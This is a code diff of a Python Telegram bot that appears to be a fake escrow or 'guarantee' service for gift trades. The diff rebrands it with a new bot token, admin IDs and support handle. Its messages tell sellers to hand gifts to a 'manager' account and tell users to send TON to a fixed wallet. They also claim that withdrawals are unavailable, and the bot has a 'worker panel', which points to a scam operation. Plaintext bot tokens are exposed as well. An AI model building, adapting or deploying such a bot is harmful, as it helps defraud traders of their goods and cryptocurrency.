@@ -26,9 +26,9 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-BOT_TOKEN = "8878609336:AAGF6NRK76iPdbJQFICgNUrNixw4xfqQkYQ"
-TARGET_CHAT_ID = -1004294182959
-ADMIN_IDS = {7199344406, 840124859}
+BOT_TOKEN = "8873335524:AAGwG9JddGX0QmQr3tJrATJ2u11j7C9rULA"
+TARGET_CHAT_ID = -5540153290
+ADMIN_IDS = {7199344406, 8521451460}
 MAINTENANCE_MODE = False
 BOT_USERNAME = None
 
@@ -57,7 +57,7 @@ RU_TEXTS = {
         "🎁 Надёжный сервис для безопасных сделок!\n"
         "✨ Автоматизировано, быстро и без лишних хлопот!\n\n"
         "<blockquote>💎 комиссия за услугу 1%\n"
-        "💎поддержка 24/7: @giftguarantsupp</blockquote>\n\n"
+        "💎поддержка 24/7: @henkiyy2</blockquote>\n\n"
         "🛡️ Теперь ваши сделки под защитой!"
     ),
     "maintenance_message": (
@@ -91,7 +91,7 @@ RU_TEXTS = {
     "payment_confirmed_seller_message": (
         "<b>🔔 Оплата подтверждена для сделки #{deal_id}</b>\n\n"
         "📦 Описание: <i>{description}</i>\n\n"
-        "<i>Обязательно отправьте подарок менеджеру - @giftguarantsupp</i>\n\n"
+        "<i>Обязательно отправьте подарок менеджеру - @henkiyy2</i>\n\n"
         "<b>⚠️ Отправляйте товар только тому, кто указан здесь. В случае отправки другому аккаунту возврата не будет. Обязательно записывайте на видео момент передачи.</b>"
     ),
     "seller_notification_message": (
@@ -169,7 +169,7 @@ RU_TEXTS = {
         "<i>Для пополнения баланса переведите TON на адрес:</i>\n"
         "<code>UQCVtk2BALaNDCMpnKsxNOAQ9mrRFdP3F1CglWyWUIeUEcG2</code>\n\n"
         "<i>После перевода обязательно отправьте скриншот в поддержку для зачисления средств.</i>\n\n"
-        "📞 Поддержка: @giftguarantsupp"
+        "📞 Поддержка: @henkiyy2"
     ),
     "deposit_card_unavailable": "❌ Пополнение картой временно недоступно.",
     "withdraw_limit": "❌ Недостаточно средств на балансе.",
@@ -198,7 +198,7 @@ RU_TEXTS = {
         "• 💎 Проверенные продавцы\n"
         "• 📞 24/7 Поддержка\n"
         "• ⭐️ 99.8% положительных отзывов</blockquote>\n\n"
-        "📞 Поддержка: @giftguarantsupp\n\n"
+        "📞 Поддержка: @henkiyy2\n\n"
         "<blockquote>Информация обновляется каждые 5 минут</blockquote>"
     ),
     "error_occurred": "Произошла ошибка. Попробуйте позже.",
@@ -265,7 +265,7 @@ EN_TEXTS = {
     "payment_confirmed_seller_message": (
         "<b>🔔 Payment confirmed for deal #{deal_id}</b>\n\n"
         "📦 Description: <i>{description}</i>\n\n"
-        "<i>Be sure to send a gift to the manager - @giftguarantsupp</i>\n\n"
+        "<i>Be sure to send a gift to the manager - @henkiyy2</i>\n\n"
         "<b>⚠️ Send the item only to the person specified here. If you send the item to someone else, there will be no refund. Be sure to record the transfer on video.</b>"
     ),
     "seller_notification_message": (
@@ -343,7 +343,7 @@ EN_TEXTS = {
         "<i>To top up your balance, transfer TON to the address:</i>\n"
         "<code>UQCVtk2BALaNDCMpnKsxNOAQ9mrRFdP3F1CglWyWUIeUEcG2</code>\n\n"
         "<i>After the transfer, be sure to send a screenshot to support for fund crediting.</i>\n\n"
-        "📞 Support: @giftguarantsupp"
+        "📞 Support: @henkiyy2"
     ),
     "deposit_card_unavailable": "❌ Card deposit is temporarily unavailable.",
     "withdraw_unavailable": "❌ Withdrawals are temporarily unavailable.",
@@ -371,7 +371,7 @@ EN_TEXTS = {
         "• 💎 Verified sellers\n"
         "• 📞 24/7 Support\n"
         "• ⭐️ 99.8% positive reviews</blockquote>\n\n"
-        "📞 Support: @giftguarantsupp\n\n"
+        "📞 Support: @henkiyy2\n\n"
         "<blockquote>Information is updated every 5 minutes</blockquote>"
     ),
     "error_occurred": "An error occurred. Please try again later.",
@@ -645,7 +645,7 @@ def get_main_menu(lang, user_id):
     )
     builder.row(
         InlineKeyboardButton(text=get_text(lang, "about_button"), callback_data="about"),
-        InlineKeyboardButton(text=get_text(lang, "support_button"), url="https://t.me/giftguarantsupp")
+        InlineKeyboardButton(text=get_text(lang, "support_button"), url="https://t.me/henkiyy2")
     )
     if user_id in WORKERS:
         builder.row(InlineKeyboardButton(text="🛠 Панель Воркера", callback_data="worker_panel"))
